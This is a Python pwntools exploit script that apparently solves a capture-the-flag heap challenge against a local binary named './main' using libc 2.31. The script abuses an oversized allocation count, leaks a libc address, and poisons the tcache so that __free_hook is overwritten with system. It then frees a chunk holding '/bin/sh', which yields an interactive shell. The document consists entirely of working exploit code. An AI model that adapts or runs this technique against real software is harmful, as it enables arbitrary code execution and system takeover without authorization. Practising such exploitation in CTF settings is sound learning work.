#!/usr/bin/env python3
import time
from pwn import *
context.log_level = "DEBUG"
context.arch = 'amd64'
p = process("./main")
libc = ELF("./libc-2.31.so")

def alloc(n,c):
    p.sendlineafter('>> ','1')
    p.sendlineafter(': ',str(n))
    p.sendlineafter(':',str(c))
def free():
    p.sendlineafter('>> ','2')
def edit(idx,size,data):
    p.sendlineafter('>> ','3')
    p.sendlineafter(': ',str(idx))
    p.sendlineafter(': ',str(size))
    p.sendline(data)
def view(idx):
    p.sendlineafter('>> ','4')
    p.sendlineafter(': ',str(idx))

def main():
    alloc(5,1)#0 1 2 3 4
    alloc(1,3)#5
    alloc(int(2**32) - 6 + 3,4)
    time.sleep(20)
    free()
    free()
    view(4)
    base = u64(p.recv(6).ljust(8,b"\x00")) - 0x1ebbe0
    log.success('LIBC BASE => ' + hex(base))
    pause()
    #PLAN A
    system = base + libc.sym['system']
    free_hook = base + libc.sym['__free_hook']
    alloc(4,2)
    free()
    free()
    time.sleep(0.5)
    edit(6,128,p64(free_hook))
    alloc(2,2)
    edit(7,128,p64(system))
    alloc(2,1)
    edit(9,128,b"/bin/sh\x00")
    free()
    pause()
    
    p.interactive()


if __name__ == "__main__":
    main()
